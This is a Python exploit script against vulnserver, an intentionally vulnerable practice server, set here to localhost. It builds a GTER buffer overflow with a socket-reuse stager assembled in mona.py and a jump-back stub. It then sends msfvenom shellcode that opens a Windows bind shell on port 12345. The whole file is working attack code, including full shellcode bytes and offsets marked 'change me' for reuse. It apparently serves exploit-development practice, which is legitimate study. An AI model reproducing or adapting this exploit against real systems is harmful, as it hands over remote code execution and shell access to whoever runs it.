import time
import struct
import socket

VULNSRVR_CMD = b"GTER /.:/ "  # change me
CRASH_LEN = 5011  # change me
OFFSET = 146  # change me
SLED_LENGTH = 5

target = ("127.0.0.1", 9999)  # vulnserver

# msfvenom -p windows/shell_bind_tcp LPORT=12345 EXITFUNC=thread -f python -v shellcode
# Payload size: 328 bytes
shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shellcode += b"\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2"
shellcode += b"\xfd\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff"
shellcode += b"\xd5\x97\x68\x02\x00\x30\x39\x89\xe6\x6a\x10"
shellcode += b"\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68" 
shellcode += b"\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b" 
shellcode += b"\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff" 
shellcode += b"\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57" 
shellcode += b"\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44" 
shellcode += b"\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44" 
shellcode += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53" 
shellcode += b"\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e" 
shellcode += b"\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5" 
shellcode += b"\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff"
shellcode += b"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
shellcode += b"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

"""
Socket Reuse - Stage-2
======================

Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\10\Debuggers\x86\mona.py asm -s push esp # pop eax # add ax, 0x188 # push [eax] # pop esi # sub esp, 74 # xor ebx, ebx # push ebx # add bh, 4 # sub ebx, 6d # push ebx # push esp # pop ebx # add ebx, 78 # push ebx # push esi # mov edi, ffbfdad4 # neg edi # call edi # xor ecx, ecx # push ecx # push eax # push ebx # push esi # call edi
Opcode results : 
---------------- 
 push esp = \x54
 pop eax = \x58
 add ax, 0x188 = \x66\x05\x88\x01
 push [eax] = \xff\x30
 pop esi = \x5e
 sub esp, 74 = \x83\xec\x74
 xor ebx, ebx = \x31\xdb
 push ebx = \x53
 add bh, 4 = \x80\xc7\x04
 sub ebx, 6d = \x83\xeb\x6d
 push ebx = \x53
 push esp = \x54
 pop ebx = \x5b
 add ebx, 78 = \x83\xc3\x78
 push ebx = \x53
 push esi = \x56
 mov edi, ffbfdad4 = \xbf\xd4\xda\xbf\xff
 neg edi = \xf7\xdf
 call edi = \xff\xd7
 xor ecx, ecx = \x31\xc9
 push ecx = \x51
 push eax = \x50
 push ebx = \x53
 push esi = \x56
 call edi = \xff\xd7
 Full opcode : \x54\x58\x66\x05\x88\x01\xff\x30\x5e\x83\xec\x74\x31\xdb\x53\x80\xc7\x04\x83\xeb\x6d\x53\x54\x5b\x83\xc3\x78\x53\x56\xbf\xd4\xda\xbf\xff\xf7\xdf\xff\xd7\x31\xc9\x51\x50\x53\x56\xff\xd7 
"""
socket_reuse = b"\x54\x58\x66\x05\x88\x01\xff\x30\x5e\x83\xec\x74\x31\xdb\x53\x80\xc7\x04\x83\xeb\x6d\x53\x54\x5b\x83\xc3\x78\x53\x56\xbf\xd4\xda\xbf\xff\xf7\xdf\xff\xd7\x31\xc9\x51\x50\x53\x56\xff\xd7"

""" 
jmp to stager
=============

Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\10\Debuggers\x86\mona.py asm -s push esp # pop ecx # sub ecx, 0x64 # jmp ecx
Opcode results : 
---------------- 
 push esp = \x54
 pop ecx = \x59
 sub ecx, 0x64 = \x83\xe9\x64
 jmp ecx = \xff\xe1
 Full opcode : \x54\x59\x83\xe9\x64\xff\xe1
"""

payload = VULNSRVR_CMD
payload += b"A" * 50
payload += socket_reuse
payload += b"\x90" * (OFFSET - len(payload) + len(VULNSRVR_CMD))
payload += struct.pack("<I", 0x625011af)  # change me
payload += b"\x54\x59\x83\xe9\x64\xff\xe1"  # push esp # pop ecx # sub ecx, 0x64 # jmp ecx
payload += b"\x90" * (CRASH_LEN - len(payload))

with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome to Vulnerable Server! ... 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")

    time.sleep(2)
    sock.send(shellcode + b"\x90" * (0x393 - len(shellcode)))